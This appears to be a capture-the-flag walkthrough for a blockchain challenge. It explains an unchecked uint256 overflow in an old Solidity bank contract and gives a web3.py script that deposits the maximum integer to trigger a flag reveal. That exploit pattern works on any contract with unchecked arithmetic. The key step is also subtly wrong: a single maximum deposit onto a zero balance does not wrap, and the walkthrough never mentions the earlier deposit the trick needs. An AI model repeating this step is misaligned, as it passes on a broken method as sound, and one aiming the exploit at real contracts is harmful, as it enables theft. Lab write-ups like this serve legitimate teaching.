# SMART OVERFLOW PROBLEM GUIDE:

*(Blockchain — Medium, 300pt)*

## HINTS:
Hint 1: What if `balances[msg.sender]` gets smaller after a deposit?
Hint 2: Read the reveal condition carefully.
Hint 3: Why do attackers like integers?

## TOOLS:
`web3.py`

## WALKTHROUGH:
1. `IntOverflowBank.sol` (Solidity `^0.6.12` — no built-in overflow checks): `deposit(amount)` adds to your balance, then reveals the flag if `balances[msg.sender] < amount`. Normally impossible... unless `uint256` overflows.

2. Deposit `2**256 - 1` (max uint256). Adding it wraps the balance below `amount`, tripping the reveal:
```python
MAX = 2**256 - 1
tx = c.functions.deposit(MAX).build_transaction({'from':ME,'gas':200000,
    'gasPrice':w3.eth.gas_price,'nonce':w3.eth.get_transaction_count(ME)})
s = w3.eth.account.sign_transaction(tx, PRIV)
w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(s.raw_transaction))
```
    - Flag shows on the challenge status page.
        - Answer: `picoCTF{...}` (instance-specific)

## NOTES:
- Pre-0.8 Solidity does unchecked arithmetic; `uint256 + huge` wraps around past 2^256 back toward 0.
- Modern Solidity (>=0.8) reverts on overflow; this bug is specific to old compilers or `unchecked{}` blocks.
